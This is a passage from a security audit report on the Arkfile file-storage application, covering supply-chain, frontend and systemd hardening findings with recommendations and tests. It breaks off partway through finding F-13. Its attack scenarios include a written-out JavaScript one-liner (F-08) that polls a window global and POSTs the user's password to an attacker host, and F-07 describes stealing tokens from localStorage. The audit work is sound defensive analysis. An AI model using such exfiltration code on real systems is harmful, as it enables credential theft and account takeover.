  4. Add an audit-log entry every time the token is generated **and** every time it is redeemed. Operators can detect a stolen-and-redeemed token by reviewing the audit log.
  5. Bound the token lifetime to (e.g.) 15 minutes from boot; refuse redemption after that, requiring the operator to restart the service to issue a fresh one.
- Suggested tests:
  - Integration: redeem a fresh bootstrap token after the configured TTL; expect 403.
  - Audit-log test: verify the redemption event lands in `admin_logs` (or whichever table Slice A defines) with the operator's username.
- Cross-refs: Slice A A-26 (admin bootstrap path), Slice F F-01 (XFF bypass), Slice F F-09 (no `LimitCORE=0` — a core dump of arkfile-during-bootstrap would also contain the token).

---

### Finding F-04: WASM artifact (`/js/libopaque.js`) loaded without Subresource Integrity

- Severity: **High**
- Confidence: **Medium**
- Category: supply-chain / cryptographic
- Component: `client/static/index.html`, build pipeline, asset-serving path
- Affected files/functions:
  - `client/static/index.html:355` — `<script src="/js/libopaque.js"></script>` (no `integrity=`, no `crossorigin=`),
  - `client/static/index.html:356` — `<script src="/js/dist/app.js"></script>` (same),
  - `client/static/js/libopaque.js` — 345 KB checked-in artifact built from `vendor/stef/libopaque` via `scripts/setup/build-libopaque-wasm.sh`,
  - `handlers/middleware.go:359-370` — CSP `script-src 'self' 'wasm-unsafe-eval'` (same-origin only).
- Description: The OPAQUE WASM library is loaded same-origin via a plain `<script>` tag with no Subresource Integrity hash. CSP `script-src 'self'` blocks off-origin script loads, which mitigates external substitution. Same-origin substitution paths remain in scope:
  - A bug in the asset-copy step in `build.sh` that picks up a stale `libopaque.js` from a different branch.
  - A misconfigured CDN / proxy / load-balancer cache (none deployed today, but Caddy with explicit caching directives would qualify).
  - A compromised build artifact (a malicious commit to `vendor/stef/libopaque` that is not detected by code review — `idsrp.md` §13 explicitly worries about this).
  - A malicious admin with write access to `/opt/arkfile/client/static/js/` who swaps in a tampered library.

  Because OPAQUE is the entire authentication primitive, a tampered `libopaque.js` is a Critical-impact substitution — it can be made to send the plaintext password to an attacker-controlled subresource (CSP would not block this for `connect-src 'self' data: blob:` if the data exfil is encoded in a same-origin fetch).

- Evidence:
  ```html
  <!-- client/static/index.html:355-356 -->
  <script src="/js/libopaque.js"></script>
  <script src="/js/dist/app.js"></script>
  ```
  ```
  // handlers/middleware.go:359-370 — CSP intentionally allows same-origin scripts
  csp := "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; ..."
  ```
- Attack scenario:
  1. Attacker gains write access to `/opt/arkfile/client/static/js/libopaque.js` (a misconfigured CI deploy, a tampered backup-restore, a compromised operator account).
  2. The tampered library passes its OPAQUE handshake normally but `fetch`es the plaintext password to a same-origin path that the attacker has also registered (e.g. by squatting an unauthenticated endpoint or by tunneling through `/api/contact-info` — Slice E E-15).
  3. CSP `script-src 'self'` passes because the source remains same-origin. No SRI exists to detect the swap.
- Impact: Any subresource-substitution path on the WASM file becomes a silent password-exfiltration channel. Defense-in-depth gap; the same-origin restriction is not sufficient given the OPAQUE library's role.
- Recommendation:
  1. Generate a SHA-384 hash of `client/static/js/libopaque.js` at build time and bake the `integrity="sha384-..."` attribute into `index.html` and `shared.html`. Same for `/js/dist/app.js`.
  2. Automate it: in `scripts/setup/build.sh`, after the WASM and TS builds complete, compute hashes and substitute placeholders in the HTML templates.
  3. Pin the WASM artifact in `config/dependency-hashes.json` alongside SeaweedFS — but use SHA-256 (not MD5; see F-11).
  4. Verify the WASM artifact on every server startup against the recorded hash and refuse to start on mismatch. (`monitoring/key_health.go` is the obvious place to add a `verifyClientArtifacts()` check.)
- Suggested tests:
  - Integration: tamper with `libopaque.js` byte-for-byte after `build.sh` runs; the next browser load should hard-fail with a CSP/SRI error and the server-startup self-test should refuse to start.
  - Unit (Go): `verifyClientArtifacts(t)` reads the served file and compares against `dependency-hashes.json`.
- Cross-refs: Slice F F-11 (MD5), Slice F F-13 (npm pinning), Slice F F-22 (sourcemap exposure adjacent).

---

### Finding F-05: Go binaries built without `-trimpath`, `-buildid=`, `-ldflags='-s -w'`, `-buildvcs=false`

- Severity: **High**
- Confidence: **High**
- Category: supply-chain / operational / privacy
- Component: `scripts/setup/build.sh`
- Affected files/functions:
  - `scripts/setup/build.sh:402-433` (`build_go_binaries_static`),
  - `scripts/setup/build.sh:414` — `local STATIC_LDFLAGS='-extldflags "-static"'` (this is the **only** ldflag),
  - `scripts/setup/build.sh:417,421,425` — the three `go build` invocations for `arkfile`, `arkfile-client`, `arkfile-admin`.
- Description: All three binaries are built with `go build -a -ldflags '-extldflags "-static"' -o ...`. Missing flags:

  | Flag | Purpose | Consequence today |
  |---|---|---|
  | `-trimpath` | Remove local FS paths from the binary | Build-host paths (e.g. `/home/<developer>/.../Arkfile/...`) are embedded in the binary and visible to anyone with shell access. Privacy leak; also defeats reproducibility. |
  | `-buildid=` (set to empty or deterministic) | Make the build ID deterministic | Each rebuild produces a different `BuildID`; binaries are not bitwise-reproducible even with identical source. Defeats SLSA-level supply-chain audit. |
  | `-ldflags '-s -w'` | Strip the symbol table + DWARF | Full debug symbols are shipped to operators. ~30% larger binary; trivial reverse-engineering of all internal types and symbols. |
  | `-buildvcs=false` | Don't embed git commit / dirty state | The `vcs.modified=true` flag from a dirty checkout shows up in `go version -m`. Reveals build provenance to anyone with the binary. |

  None of these are exploitable on their own, but together they (a) leak developer paths/hostnames into binaries that ship to operators, (b) prevent supply-chain audit (no reproducible builds, no provenance), and (c) make reverse-engineering trivial. `idsrp.md` §13 explicitly calls out "build reproducibility" and "provenance, signatures, and attestations" as Slice F items.

  There is also **no release signing** (no `cosign`, `minisign`, GPG, or sigstore attestation) and **no SBOM** generation. Combined with F-04 (no SRI on the WASM artifact) and F-13 (no `--frozen-lockfile`) the binary supply chain is unverifiable end-to-end.

- Evidence:
  ```bash
  # scripts/setup/build.sh:414-425
  local STATIC_LDFLAGS='-extldflags "-static"'

  echo "Building arkfile server..."
  "$GO_BINARY" build -a -ldflags "$STATIC_LDFLAGS" -o ${BUILD_DIR}/${APP_NAME} .

  echo "Building arkfile-client..."
  "$GO_BINARY" build -a -ldflags "$STATIC_LDFLAGS" -o ${BUILD_DIR}/arkfile-client ./cmd/arkfile-client

  echo "Building arkfile-admin..."
  "$GO_BINARY" build -a -ldflags "$STATIC_LDFLAGS" -o ${BUILD_DIR}/arkfile-admin ./cmd/arkfile-admin
  ```
- Attack scenario:
  - **Information disclosure**: an attacker who obtains the `arkfile` binary (off a public release page, a stolen backup, a compromised dev machine) extracts developer home-directory paths and hostnames via `strings`, useful for further targeting.
  - **Supply-chain audit gap**: an organization receiving a binary from the Arkfile project has no way to verify it was built from the claimed git commit. A maliciously-modified binary cannot be distinguished from the legitimate one.
- Impact: Build provenance is unverifiable. Privacy leak from embedded paths. Larger attack surface for reverse engineering. Per `idsrp.md` §22.1 these are all explicit Slice F items.
- Recommendation:
  1. Change `STATIC_LDFLAGS` to `'-extldflags "-static" -s -w -buildid='` and add `-trimpath -buildvcs=false` to each `go build` invocation.
  2. Adopt reproducible-build conventions: set `SOURCE_DATE_EPOCH` from the git commit time, drop `-a` (rebuilds everything unnecessarily and prevents caching), and verify bitwise reproducibility with a second build in CI.
  3. Sign each release binary with `cosign sign-blob` or `minisign` and publish detached signatures alongside the artifacts.
  4. Emit an SBOM (`syft packages dir:.`) at release time and publish it.
- Suggested tests:
  - CI test: build twice from a clean checkout; `sha256sum` of each binary must match between runs.
  - CI test: `strings ./build/bin/arkfile | grep -E '/home/|/Users/'` returns no matches.
  - CI test: `go version -m ./build/bin/arkfile | grep vcs.modified` returns no `true` for tagged releases.
- Cross-refs: Slice F F-04 (WASM SRI), F-13 (Bun pinning), F-25 (no `govulncheck`).

---

### Finding F-06: libsodium is the host's apt/dnf package, not a pinned vendored submodule

- Severity: **High**
- Confidence: **High**
- Category: supply-chain / cryptographic
- Component: `scripts/setup/build.sh`, `.gitmodules`
- Affected files/functions:
  - `scripts/setup/build.sh:409` — `export CGO_LDFLAGS="-L./vendor/stef/libopaque/src -L./vendor/stef/liboprf/src -lopaque -loprf $(pkg-config --libs --static libsodium)"`,
  - `.gitmodules` — pins `libopaque` (`6e9ac92`) and `liboprf` (`a8c0410`) only; **no libsodium submodule**.
- Description: libopaque depends on libsodium for AEAD / KDF / scalar arithmetic. The Arkfile build links against whatever libsodium is installed on the build host via `pkg-config --libs --static libsodium`. Consequences:

  1. **No pinning by hash.** Two builds on two different machines (or the same machine across an `apt upgrade`) link against potentially different libsodium versions. Reproducibility is impossible.
  2. **Supply-chain transitivity.** A compromise of the host's package manager — or of the apt/dnf mirror it points at — silently changes the cryptographic primitive underlying OPAQUE. Every OPAQUE-derived key the Arkfile build produces depends on this binary.
  3. **Reviewer cannot audit "the libsodium that ships".** `00-plan.md` §2 sets the scope to "audit the CGO surface and the build flags". With libsodium unpinned, the CGO surface's correctness is contingent on a moving target.

  This is a strictly worse supply-chain posture than the way `libopaque` and `liboprf` are handled (git submodule + pinned commit). The fix is the same approach: add libsodium as a submodule at a known-good commit, build it from source as part of `build-libopaque.sh`, and link statically against the resulting `.a`.

- Evidence:
  ```bash
  # scripts/setup/build.sh:407-409
  export CGO_ENABLED=1
  export CGO_CFLAGS="-I./vendor/stef/libopaque/src -I./vendor/stef/liboprf/src"
  export CGO_LDFLAGS="-L./vendor/stef/libopaque/src -L./vendor/stef/liboprf/src -lopaque -loprf $(pkg-config --libs --static libsodium)"
  ```
  ```
  # .gitmodules — no libsodium entry (manual inspection)
  ```
- Attack scenario:
  - Host's libsodium package is rolled to a backdoored release (via mirror compromise or maintainer-account takeover, both of which have historical precedent). The Arkfile build silently picks up the new version on the next CI run.
  - Or: a build-host configuration drift means one operator's `arkfile-client` is statically linked against libsodium 1.0.18 and another's against 1.0.20. The two binaries behave subtly differently for edge-case inputs; bugs are hard to reproduce.
- Impact: Cryptographic primitive under OPAQUE is not under the Arkfile project's version control. Reproducible builds are impossible (F-05 dependency). Audit of the CGO surface is incomplete.
- Recommendation:
  1. Add libsodium as a git submodule at a known release tag. Build it from source in `scripts/setup/build-libopaque.sh` as a static `.a`.
  2. Change `CGO_LDFLAGS` to point at the vendored static lib: `-L./vendor/jedisct1/libsodium/src/.libs -lsodium`.
  3. Verify in `verify_static_binaries` that no dynamic libsodium dependency is reported by `ldd`.
  4. Pin the commit / tag in `.gitmodules` so reproducible builds become possible.
- Suggested tests:
  - CI: `ldd ./build/bin/arkfile` must report `not a dynamic executable` (already in `verify_static_binaries`). Additionally, `strings ./build/bin/arkfile | grep libsodium | head` should show only embedded version strings, no SONAME references.
  - CI: bitwise reproducibility test (see F-05).
- Cross-refs: Slice F F-05 (reproducible builds), F-12 (rqlite-from-source).

---

### Finding F-07: Full JWT and refresh token stored in `localStorage`

- Severity: **High**
- Confidence: **High**
- Category: frontend / authorization
- Component: `client/static/js/src/utils/auth.ts`
- Affected files/functions:
  - `client/static/js/src/utils/auth.ts:39, 43, 47, 48` (`localStorage.getItem('token')`, `localStorage.getItem('refresh_token')`, `localStorage.setItem('token', ...)`, `localStorage.setItem('refresh_token', ...)`),
  - cross-ref Slice A A-05 (browser auth-token storage policy).
- Description: Both the full JWT and the refresh token are persisted to `localStorage` under the keys `token` and `refresh_token`. Any same-origin JavaScript can read both:

  - XSS via a future filename / display-name / contact-info / share-message DOM sink — there are 12 files in `client/static/js/src/**` containing `innerHTML` (see F-17).
  - A compromised dependency (`@noble/hashes`, `zxcvbn`, `bun-types`, `typescript`) bundled into `dist/app.js` could exfiltrate the tokens without modifying any Arkfile-authored code.
  - A browser extension with `<all_urls>` permissions trivially harvests both.

  This is a direct confirmation of Slice A A-05's "browser holds long-lived secret-adjacent material" finding, with file:line evidence.

  The standard mitigation (cookie storage with `HttpOnly`, `Secure`, `SameSite=Strict`) is documented elsewhere in the codebase as deliberately avoided ("intentional choice"). The trade-off is that XSS now reads the JWT directly rather than being constrained to in-document API calls. Given that `idsrp.md` §12 treats XSS as "especially severe because it may expose passwords, OPAQUE material, derived keys, file keys, plaintext files, and decrypted metadata", the current trade-off favors developer ergonomics over user safety.

- Evidence:
  ```ts
  // client/static/js/src/utils/auth.ts:33-50 (approximate, from grep)
  static getToken(): string | null {
      return localStorage.getItem(this.TOKEN_KEY);
  }
  static getRefreshToken(): string | null {
      return localStorage.getItem(this.REFRESH_TOKEN_KEY);
  }
  static setTokens(token: string, refreshToken: string): void {
      localStorage.setItem(this.TOKEN_KEY, token);
      localStorage.setItem(this.REFRESH_TOKEN_KEY, refreshToken);
  }
  ```
- Attack scenario:
  1. Attacker discovers a stored-XSS path through a filename or display-name field (filenames are encrypted but display-names / contact-info are not encrypted at storage — see Slice E E-15, E-18).
  2. The injected payload reads `localStorage.getItem('token')` and `getItem('refresh_token')`, posts both to an attacker-controlled endpoint via `fetch(...)`.
  3. Attacker has the user's full auth state until the refresh token expires.
- Impact: Realistic account takeover in the presence of any same-origin script execution. Combined with the 12 `innerHTML` sinks in `src/**` and the absence of Trusted Types (F-17), this is the canonical XSS-to-account-takeover path that `idsrp.md` §12 warns about.
- Recommendation:
  1. Move auth tokens to `HttpOnly` cookies with `Secure`, `SameSite=Strict`, and `Path=/api`. The Go side already accepts `Authorization: Bearer` so the cookie path needs a small middleware addition.
  2. Refactor the frontend to drop the localStorage path entirely (no defaults, no fallback — greenfield, per `AGENTS.md`).
  3. Adopt CSRF defense for state-changing requests: SameSite=Strict + a `X-CSRF-Token` double-submit cookie. Slice E noted there is no CSRF middleware today; this is the right time to add one.
  4. Add Trusted Types (`require-trusted-types-for 'script'`) and migrate every `innerHTML` sink to a DOM-builder helper (F-17 recommendation).
- Suggested tests:
  - Browser e2e: open the app, log in, then `document.cookie` should contain the JWT cookie and `localStorage.getItem('token')` should return `null`.
  - Negative: synthesize a CSP violation report path; verify the JWT is not exfiltrated.
- Cross-refs: Slice A A-05; Slice F F-08 (related secret-in-window), F-17 (Trusted Types), F-14 (inline-handler CSP gap).

---

### Finding F-08: Plaintext password stored on `window.totpLoginData` during TOTP step

- Severity: **High**
- Confidence: **High**
- Category: frontend / authorization / privacy
- Component: `client/static/js/src/auth/login.ts`, `client/static/js/src/auth/totp.ts`
- Affected files/functions:
  - `client/static/js/src/auth/login.ts:163` — `window.totpLoginData = { ..., password }` after OPAQUE-login-finalize succeeds,
  - `client/static/js/src/auth/totp.ts:49` — sets `window.totpLoginData` for the modal flow,
  - `client/static/js/src/auth/totp.ts:182, 195, 209-223` — reads `totpLoginData.password`, uses it to call into the post-TOTP code path that re-derives the account key, then attempts to scrub the field at `:213-215`.
- Description: After OPAQUE login finalizes and before TOTP succeeds, the browser holds the user's plaintext password in a same-origin `window` global named `totpLoginData`. The reason given in code comments is that the post-TOTP code needs to re-run Argon2id to derive the account key (which OPAQUE itself does not expose because the OPAQUE export key is intentionally not used for file encryption — per `AGENTS.md`).

  The lifetime is short (one HTTP round trip to `/api/totp/verify`) but the field is unreachable to any other tab and trivial for an XSS payload to read. The scrubbing logic at `totp.ts:213-215` is best-effort:

  ```ts
  if (totpLoginData.password) {
      totpLoginData.password = '';
  }
  delete (totpLoginData as any).password;
  ```

  The scrub runs only **after** the TOTP-verify network call returns. Between the call and the scrub, the password is still in memory and an XSS payload running on a `setInterval(0, ...)` poll captures it.

  Direct confirmation of Slice A A-04 with file:line evidence.

- Evidence:
  ```ts
  // client/static/js/src/auth/login.ts:163 (from grep)
  window.totpLoginData = {
      tempToken: ...,
      username: ...,
      password,           // <-- plaintext password
      sessionKey: ...,
      ...
  };
  ```
  ```ts
  // client/static/js/src/auth/totp.ts:209-215
  const carriedPassword = totpLoginData.password;
  ...
  if (totpLoginData.password) {
      totpLoginData.password = '';
  }
  delete (totpLoginData as any).password;
  ```
- Attack scenario:
  1. Attacker has any same-origin code execution (XSS, malicious extension, compromised dep). They install `setInterval(() => { if (window.totpLoginData?.password) fetch('//attacker/...', { method: 'POST', body: window.totpLoginData.password }); }, 0)`.
  2. Victim logs in. Between OPAQUE-finalize and TOTP-verify-success, the interval fires and exfiltrates the password.
  3. Attacker has the plaintext account password and can re-authenticate as the user even after the TOTP step. From the password they can also derive the Account Key (Argon2id with the deterministic salt) and decrypt every file owned by the user.
- Impact: Catastrophic in the presence of any same-origin code execution. The "OPAQUE protects the password from the server" guarantee survives, but the guarantee against client-side exfiltration is broken by the design choice of carrying the password through the TOTP step.
- Recommendation:
  1. **Derive the Account Key before the TOTP step.** Once OPAQUE-finalize succeeds, the password is no longer needed; run Argon2id to derive the Account Key, store the *derived* key (zeroized after first use), and drop the password before showing the TOTP modal.
  2. If Argon2id cost on weak devices is the reason for deferring (a few seconds is unpleasant UX), do the derivation in a Web Worker concurrently with the TOTP modal render so it does not block the UI.
  3. If neither option is acceptable, encrypt the carried password in memory under a transient key bound to the TOTP modal's component lifetime, and clear that key on modal close. This is still vulnerable to a determined XSS but raises the bar.
- Suggested tests:
  - Browser e2e: log in, intercept the moment between OPAQUE-finalize and TOTP-verify-success, assert `window.totpLoginData?.password === undefined`.
  - Static-analysis test: grep `client/static/js/src/**` for `.password` reads outside `auth/login.ts` and `auth/register.ts`. The TOTP path should not appear.
- Cross-refs: Slice A A-04; Slice F F-07 (related token storage), F-14 (inline-handler CSP gap allows XSS landing zone).

---

### Finding F-09: systemd hardening gaps across all four units; biggest is the absence of `LimitCORE=0`

- Severity: **Medium**
- Confidence: **High**
- Category: operational / defense-in-depth
- Component: `systemd/arkfile.service`, `systemd/caddy.service`, `systemd/rqlite.service`, `systemd/seaweedfs.service`
- Affected files/functions: all four `.service` files (entire).
- Description: Each unit has a baseline of sandboxing directives present (`NoNewPrivileges`, `ProtectSystem`, `ProtectHome`, `PrivateTmp`, `Protect{Kernel,Control}*`). Across the four units the **missing** directives are:

  | Directive | arkfile | caddy | rqlite | seaweedfs | Effect of absence |
  |---|---|---|---|---|---|
  | `LimitCORE=0` | missing | missing | missing | missing | A coredump triggered by SIGSEGV / `abort()` / a CGO crash writes process memory to `/var/lib/systemd/coredump/`. For `arkfile` that includes the OPAQUE server key, JWT signing keys, TOTP master key, every in-flight TOTP secret, and any cached file key. **Highest-impact gap.** |
  | `MemoryDenyWriteExecute=yes` | missing | missing | missing | missing | A successful exploit can `mprotect` writable memory to executable. |
  | `LockPersonality=yes` | missing | missing | missing | missing | A successful exploit can change personality (e.g. disable ASLR). |
  | `RestrictAddressFamilies=AF_INET AF_INET6 AF_UNIX` | missing | missing | missing | missing | A successful exploit can use `AF_PACKET` / `AF_NETLINK` for L2 / kernel introspection. |
  | `RestrictNamespaces=yes` | missing | missing | missing | missing | Exploit can create new user/mount/pid namespaces. |
  | `RestrictSUIDSGID=yes` | missing | missing | missing | missing | Exploit can create suid files (combined with `NoNewPrivileges` they cannot be executed by the unit, but other processes can). |
  | `ProtectClock=yes` | missing | missing | missing | missing | Exploit can call `clock_settime` / `adjtimex`. |
  | `ProtectHostname=yes` | missing | missing | missing | missing | Exploit can call `sethostname`. |
  | `ProtectProc=invisible` / `ProcSubset=pid` | missing | missing | missing | missing | Exploit can read other unit's `/proc/<pid>/environ` (relevant: caddy holds `DESEC_TOKEN` in env). |
  | `CapabilityBoundingSet=` (empty) | missing | partial | missing | missing | `caddy.service` has `AmbientCapabilities=CAP_NET_BIND_SERVICE` (needed for :443) but no `CapabilityBoundingSet` cap. Other units have no caps and no bounding set. |
  | `UMask=0077` | missing | missing | missing | missing | New files created by the unit default to 0644-readable group/other. |
  | `IPAddressDeny=any` (with explicit allows) | missing | missing | missing | missing | Exploit can reach arbitrary IPs. |
  | `SystemCallFilter=@system-service` | **present** | **present** | missing | missing | rqlite and seaweedfs lack the syscall allow-list. |
  | `PrivateDevices=yes` | present | present | present | missing | seaweedfs lacks `PrivateDevices`. |

  The `LimitCORE=0` gap is the most acute because it interacts with several other findings: F-03 (bootstrap token in journal), F-02 (admin password constant in the binary), Slice A's TOTP master key, and Slice B's KeyManager. A coredump of `arkfile.service` exposes all of them simultaneously.

  None of these gaps are exploitable on their own. They become exploitable in chain with any RCE in the Go process or the CGO surface.

- Evidence:
  ```
  # systemd/arkfile.service (full)
  [Service]
  User=arkfile
  Group=arkfile
  ...
  NoNewPrivileges=yes
  ProtectSystem=strict
  ReadWritePaths=/opt/arkfile/var /opt/arkfile/etc/keys /opt/arkfile/var/log
  ProtectHome=yes
  PrivateTmp=yes
  PrivateDevices=yes
  ProtectKernelTunables=yes
  ProtectKernelModules=yes
  ProtectControlGroups=yes
  SystemCallFilter=@system-service
  SystemCallErrorNumber=EPERM
  # (no LimitCORE=, MemoryDenyWriteExecute=, LockPersonality=, RestrictAddressFamilies=,
  #  RestrictNamespaces=, RestrictSUIDSGID=, ProtectClock=, ProtectHostname=, ProtectProc=,
  #  CapabilityBoundingSet=, UMask=, IPAddressDeny=)
  ```
  ```
  # systemd/rqlite.service: no SystemCallFilter, no PrivateDevices (has it actually — verify)
  # systemd/seaweedfs.service: no SystemCallFilter, no PrivateDevices, otherwise as above
  ```
- Attack scenario:
  - Defense-in-depth: an RCE in the OPAQUE CGO surface causes `arkfile` to SIGSEGV. With no `LimitCORE=0`, systemd writes a coredump to `/var/lib/systemd/coredump/`. An admin with `journalctl -u systemd-coredump` (or any user with read access to the coredump path on a misconfigured host) extracts the OPAQUE server key.
  - Defense-in-depth: an RCE escalates by `mprotect`-ing a stack page to executable. `MemoryDenyWriteExecute=yes` would have prevented this.
- Impact: Coredumps of `arkfile.service` leak every long-lived secret. Other sandboxing gaps raise the bar against an arbitrary RCE but do not block it.
- Recommendation:
  1. Add `LimitCORE=0` to all four units **today**. This is a one-line change with zero functional impact.
  2. Add the rest of the table as a single drop-in `*.service.d/hardening.conf`. `systemd-analyze security arkfile.service` should target a score of ≥ 3.0 (out of 10.0 by `systemd-analyze`'s inverted scale; lower is more hardened).
  3. Add `SystemCallFilter=@system-service` to `rqlite.service` and `seaweedfs.service`. The two binaries are well-behaved Go programs and will not need anything outside this set.
  4. Add `PrivateDevices=yes` to `seaweedfs.service`.
- Suggested tests:
  - Per-unit: `systemd-analyze security <unit>` and assert score thresholds in CI.
  - Crash test: `kill -SEGV` the arkfile PID; assert no file appears under `/var/lib/systemd/coredump/`.
  - Sandbox negation: in a test environment, send the arkfile process a SIGSYS-triggering syscall and verify the unit terminates.
- Cross-refs: Slice F F-03 (token in journal — also benefits), Slice A A-18 (key material persistence), Slice B B-25 (key zeroization).

---

### Finding F-10: rqlite binds `0.0.0.0:4001` and `0.0.0.0:4002` (HTTP and Raft) instead of loopback

- Severity: **Medium**
- Confidence: **High**
- Category: operational / defense-in-depth
- Component: `systemd/rqlite.service`
- Affected files/functions: `systemd/rqlite.service:12-18`.
- Description: The rqlite ExecStart line uses `-http-addr :4001` and `-raft-addr :4002`. The empty host part means "bind all interfaces" (0.0.0.0). The Arkfile architecture runs rqlite as a single-node deployment co-located with `arkfile.service` on the same host; there is no reason for it to be reachable from anywhere except loopback.

  Mitigated today by the deploy script's firewall rules (`scripts/prod-deploy.sh:168-195` opens only ssh/http/https). However:
  - Defense-in-depth gap if the firewall is misconfigured, disabled (`ufw disable`), or if iptables/nftables rules are bypassed by a kernel exploit.
  - rqlite's `-auth` flag points at `/opt/arkfile/etc/rqlite-auth.json` (line 17), which is HTTP Basic Auth. That auth is bypassable if rqlite ever supported an unauth health endpoint or if a future version's auth has a bug; loopback-only would make this irrelevant.
  - Adversarial container neighbors on the same host (e.g. a Podman / Docker rootless workload) can reach `0.0.0.0:4001` from inside the same network namespace if Arkfile is run inside a container with `--net=host`.

  Compare to `seaweedfs.service:22-24` which correctly uses `-ip=127.0.0.1 -ip.bind=127.0.0.1 -s3.ip.bind=127.0.0.1`. The rqlite unit should match.

- Evidence:
  ```
  # systemd/rqlite.service:12-18
  ExecStart=/usr/local/bin/rqlited \
      -http-addr :4001 \
      -raft-addr :4002 \
      ...
  ```
- Attack scenario:
  - Operator runs `ufw disable` for a debugging session and forgets to re-enable. rqlite is now reachable from the public internet. Anyone can attempt brute force against the HTTP Basic Auth credentials.
  - A neighbouring container / VM on the same host can reach rqlite directly, sidestepping Arkfile's auth and audit-log paths.
- Impact: Defense-in-depth gap. If the firewall fails, the only thing protecting rqlite from the internet is HTTP Basic Auth against `rqlite-auth.json`.
- Recommendation: Change to `-http-addr 127.0.0.1:4001 -raft-addr 127.0.0.1:4002`. For multi-node Raft (not currently deployed) use a private network interface address explicitly. Verify with `ss -ltnp | grep rqlited` post-deploy.
- Suggested tests:
  - Post-deploy probe: `ss -ltn 'sport = :4001 or sport = :4002'` should show only `127.0.0.1` bind addresses.
- Cross-refs: Slice E E-22 (`/readyz` reports rqlite status to anyone).

---

### Finding F-11: SeaweedFS integrity check uses MD5

- Severity: **Medium**
- Confidence: **High**
- Category: supply-chain
- Component: `config/dependency-hashes.json`
- Affected files/functions: `config/dependency-hashes.json:7-13`.
- Description: SeaweedFS release artifacts are verified against `md5_url`. MD5 has been cryptographically broken since 2004 (collision attacks since 2008 are computationally trivial). For supply-chain integrity, MD5 only protects against accidental corruption, not against an adversary who controls the upstream mirror.

  SeaweedFS publishes SHA-256 checksums alongside MD5 on the same release page (`*.tar.gz.sha256` is available next to `*.tar.gz.md5`). The fix is a one-line schema change.

- Evidence:
  ```json
  // config/dependency-hashes.json:7-13
  "linux-amd64": {
      "url": "https://github.com/seaweedfs/seaweedfs/releases/download/4.18/linux_amd64.tar.gz",
      "md5_url": "https://github.com/seaweedfs/seaweedfs/releases/download/4.18/linux_amd64.tar.gz.md5",
      ...
      "verification_method": "official_md5",
  ```
- Attack scenario:
  - Upstream release page is compromised. Attacker swaps the `linux_amd64.tar.gz` for a backdoored version and uploads a new `linux_amd64.tar.gz.md5` for the new file. Operators running `prod-deploy.sh` download both, verify them against each other (the verification passes), and install the backdoored binary.
- Impact: SeaweedFS controls the actual encrypted-blob storage. A backdoored SeaweedFS sees every encrypted blob, every chunk SHA-256, every storage key. While the data is client-side encrypted, a backdoored storage server can still mount denial-of-service, integrity, and rollback attacks (cross-ref Slice C, Slice D).
- Recommendation:
  1. Replace `md5_url` with `sha256_url`. Update the setup script (`scripts/setup/05-setup-seaweedfs.sh`) to verify SHA-256.
  2. Better: pin the binary by SHA-256 *in the file itself*, not by reference to a remote URL the same attacker controls. Hash-pin once at audit time, refuse to install on mismatch.
- Suggested tests:
  - Negative: tamper with the downloaded `tar.gz` post-fetch; assert setup fails with a hash mismatch.
- Cross-refs: Slice F F-04 (WASM SRI — same recommendation).

---

### Finding F-12: rqlite is "built from source" with no pinned commit or tag

- Severity: **Medium**
- Confidence: **High**
- Category: supply-chain
- Component: `config/dependency-hashes.json`, `scripts/setup/06-setup-rqlite-build.sh`
- Affected files/functions:
  - `config/dependency-hashes.json:20` — `"rqlite": "rqlite is built from source (see scripts/setup/06-setup-rqlite-build.sh) and does not use pre-built binaries."`,
  - `scripts/setup/06-setup-rqlite-build.sh` (not read in this slice in detail; presumed to `git clone` upstream and build current HEAD or a hand-edited tag).
- Description: "Built from source" without a pinned commit / tag means the rqlite binary in production is whatever `master` happened to be on the day the deploy ran. Reproducibility is impossible. Two operators deploying the same Arkfile version on two different days install different rqlite binaries.

  rqlite is the system of record for users, OPAQUE records, credit transactions, sessions, and admin audit logs. A regression — or a backdoor — in upstream rqlite is silently picked up on the next deploy.

- Evidence:
  ```json
  // config/dependency-hashes.json:20
  "rqlite": "rqlite is built from source (see scripts/setup/06-setup-rqlite-build.sh) and does not use pre-built binaries.",
  ```
- Attack scenario:
  - Upstream rqlite introduces a subtle bug in `WHERE` clause parsing that lets a crafted query bypass the auth layer. The next Arkfile production deploy picks it up. No CVE is filed yet because the bug is fresh.
- Impact: Database supply chain is unpinned. Reproducibility-impossible.
- Recommendation:
  1. Add an `rqlite` entry to `config/dependency-hashes.json` pinning a specific release tag and its SHA-256 (or commit hash if building from source).
  2. Change the setup script to `git checkout <tag>` before building.
  3. Verify the built binary's hash against the pinned value before installing.
- Cross-refs: Slice F F-06 (libsodium-from-host), F-11 (MD5).

---

### Finding F-13: `bun install` runs without `--frozen-lockfile`; `package.json` uses `^` ranges

- Severity: **Medium**
- Confidence: **High**
- Category: supply-chain
- Component: `client/static/js/package.json`, `client/static/js/bun.lock`, `scripts/setup/build.sh`
- Affected files/functions:
  - `client/static/js/package.json:21-27` — both `devDependencies` and `dependencies` use `^` semver ranges,
  - `client/static/js/bun.lock` — present in the working tree (text format, reviewable),
  - `scripts/setup/build.sh:349` — `${BUN_CMD} install || { echo ...; exit 1; }` (no `--frozen-lockfile`).
- Description: `package.json` pins `@noble/hashes` `^2.0.1`, `zxcvbn` `^4.4.2`, `bun-types` `^1.2.21`, `typescript` `^5.9.2`. With `^`-ranges, Bun is free to update to a newer minor/patch on every install. `bun.lock` is committed (good), but `bun install` without `--frozen-lockfile` will silently update the lockfile when an upstream registry has a newer version that satisfies the `^` range.

  Consequences:
  1. Two builds on two different days against the same `package.json` may resolve to different bundled JS in `dist/app.js`. Reproducibility is impossible.
  2. A typosquatting / dependency-confusion attack against any of these packages picks up automatically on the next `bun install`.
  3. `@noble/hashes` is part of the cryptographic surface used for non-OPAQUE primitives (SHA-256, HKDF in some helpers — Slice B has the detail). Drift on this package is a direct crypto-supply-chain risk.

  `bun.lock` is the text-format lockfile (good — much more reviewable than the legacy binary `bun.lockb`). Switching to `--frozen-lockfile` is a one-flag fix.

- Evidence:
  ```json
  // client/static/js/package.json:21-30
  "devDependencies": {
      "@types/zxcvbn": "^4.4.5",
      "bun-types": "^1.2.21",
      "typescript": "^5.9.2"
  },
  "dependencies": {
      "@noble/hashes": "^2.0.1",
      "zxcvbn": "^4.4.2"
  }
  ```
  ```bash
  # scripts/setup/build.sh:349
  ${BUN_CMD} install || { echo -e "${RED}[X] Failed to install dependencies${NC}"; exit 1; }
  ```
- Attack scenario:
